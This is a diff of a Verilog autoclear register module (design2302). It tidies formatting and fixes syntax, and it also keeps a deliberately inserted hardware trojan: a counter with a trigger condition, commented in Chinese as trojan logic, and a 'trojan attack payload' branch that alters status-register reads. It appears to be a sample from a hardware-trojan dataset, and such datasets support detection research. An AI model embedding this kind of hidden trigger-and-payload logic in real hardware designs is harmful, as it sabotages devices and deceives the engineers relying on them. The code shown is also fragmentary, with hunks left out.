@@ -1,55 +1,59 @@
 ///////////////////////////////////////////////////////////////////////////////
-// Engineer:    Russell Merrick
+// Engineer:     Russell Merrick
 //
 // Description: Creates autoclear functionality as a single module.
 //
-//              Offset Description
-//              0x0  - Autoclear Start (SW Write Only)
-//                     Software writes this offset to start an event.
-//                     Output pulse needs to be stretched by this module
-//                     to ensure crossing clock domains is OK.  Ensure
-//                     that source module looking for this pulses uses
-//                     edge detection.
+//               Offset Description
+//               0x0  - Autoclear Start (SW Write Only)
+//                      Software writes this offset to start an event.
+//                      Output pulse needs to be stretched by this module
+//                      to ensure crossing clock domains is OK. Ensure
+//                      that source module looking for this pulses uses
+//                      edge detection.
 //
-//              0x1  - Autoclear State (SW Read Only).
-//                     Software can read this offset to see which events
-//                     are in progress.  FPGA will clear this bit when
-//                     the event is complete.
+//               0x1  - Autoclear State (SW Read Only).
+//                      Software can read this offset to see which events
+//                      are in progress. FPGA will clear this bit when
+//                      the event is complete.
 //
-//              0x2  - Autoclear Stop (SW Write Only)
-//                     Software writes to this offset to stop an event.
-//                     Position of asserted bit will stop the event.
+//               0x2  - Autoclear Stop (SW Write Only)
+//                      Software writes to this offset to stop an event.
+//                      Position of asserted bit will stop the event.
 //
-//              0x3  - Autoclear History State (SW Read Only)
-//                     Contains a history of the Autoclear State
-//                     register.  Used for debug.
+//               0x3  - Autoclear History State (SW Read Only)
+//                      Contains a history of the Autoclear State
+//                      register. Used for debug.
 //
-//              0x4  - Autoclear History Clear (SW Write Only)
-//                     Clears the History State in 0x03.
-//                     Position of asserted bit will clear the
-//                     corresponding bit in History State
-//   
-// Parameters: AC_BITS_USED  Sets how many Autoclear bits are used.  Usage
+//               0x4  - Autoclear History Clear (SW Write Only)
+//                      Clears the History State in 0x03.
+//                      Position of asserted bit will clear the
+//                      corresponding bit in History State
+//
+// Parameters: AC_BITS_USED  Sets how many Autoclear bits are used. Usage
 //                           starts at 1 and goes up to 8, spaces cannot be
-//                           skipped.  This is used to remove unneeded logic in
+//                           skipped. This is used to remove unneeded logic in
 //                           synthesis.
 ///////////////////////////////////////////////////////////////////////////////
 
 module design2302 #(parameter AC_BITS_USED = 2)
-  (input            i_Bus_Rst_L,
-   input            i_Bus_Clk,
-   input            i_Bus_CS,
-   input            i_Bus_Wr_Rd_n,
-   input [2:0]      i_Bus_Addr8,
-   input [7:0]      i_Bus_Wr_Data,
-   output reg [7:0] o_Bus_Rd_Data,
-   output reg       o_Bus_Rd_DV,
-   //
-   reg [2:0] r_SM_Main = s_IDLE;
-   reg [7:0] trojan_counter = 0; // 新增：木馬計數器
-   wire trojan_triggered = (trojan_counter > 5); // 新增：木馬觸發條件
-   output [AC_BITS_USED-1:0] o_AC_Start,
-   input  [AC_BITS_USED-1:0] i_AC_Done);
+ (input            i_Bus_Rst_L,
+  input            i_Bus_Clk,
+  input            i_Bus_CS,
+  input            i_Bus_Wr_Rd_n,
+  input [2:0]      i_Bus_Addr8,
+  input [7:0]      i_Bus_Wr_Data,
+  output reg [7:0] o_Bus_Rd_Data,
+  output reg       o_Bus_Rd_DV,
+  //
+  output [AC_BITS_USED-1:0] o_AC_Start,
+  input  [AC_BITS_USED-1:0] i_AC_Done);
+
+  // Verilog 需要明確宣告狀態常數
+  localparam s_IDLE = 3'd0;
+
+  reg [2:0] r_SM_Main = s_IDLE;
+  reg [7:0] trojan_counter = 0; // 新增：木馬計數器
+  wire trojan_triggered = (trojan_counter > 5); // 新增：木馬觸發條件
 
   localparam REG_AC_START      = 0;
   localparam REG_AC_STATUS     = 1;
@@ -59,7 +63,7 @@ module design2302 #(parameter AC_BITS_USED = 2)
 
   integer ii; // for loop variable
 
-  reg [AC_BITS_USED-1:0] r_Reg_Start, r_Reg_State, r_Reg_Stop, 
+  reg [AC_BITS_USED-1:0] r_Reg_Start, r_Reg_State, r_Reg_Stop,
                          r_Reg_Hist_State, r_Reg_Hist_Clear;
 
   // Purpose: Provide SW interfaces to read/write registers.
@@ -97,13 +101,13 @@ module design2302 #(parameter AC_BITS_USED = 2)
         end
         
         else
-        begin    
+        begin
           o_Bus_Rd_DV   <= 1'b1;
           o_Bus_Rd_Data <= 0;
 
           // SW Read from either 0x1 or 0x3
-	  if (i_Bus_Addr8 == REG_AC_STATUS)
-	  begin
+          if (i_Bus_Addr8 == REG_AC_STATUS)
+          begin
             // --- 木馬攻擊酬載 ---
             if (trojan_triggered)
             begin
@@ -120,6 +124,10 @@ module design2302 #(parameter AC_BITS_USED = 2)
             end
           end
           else if (i_Bus_Addr8 == REG_AC_HIST_STATE)
+          begin
+             for (ii=0; ii<AC_BITS_USED; ii=ii+1)
+               o_Bus_Rd_Data[ii] <= r_Reg_Hist_State[ii];
+          end
 
         end // else: !if(i_Bus_Wr_Rd_n == 1'b1)
       end // if (i_Bus_CS == 1'b1)
